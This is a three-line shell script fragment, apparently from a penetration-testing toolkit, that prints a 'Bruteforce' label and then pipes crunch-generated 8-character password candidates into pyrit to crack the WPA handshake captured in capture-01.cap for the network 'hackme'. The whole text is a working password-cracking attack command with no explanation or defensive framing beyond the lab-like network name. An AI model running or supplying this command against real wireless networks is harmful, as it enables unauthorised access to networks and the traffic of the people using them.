echo "<<--- Bruteforce --->>"
echo "crunch 8 8 aaaaaaaa | pyrit -e hackme -i - -r capture-01.cap attack_passthrough"
/pentest/passwords/crunch/crunch 8 8 abcdefgh | pyrit -e hackme -i - -r capture-01.cap attack_passthrough
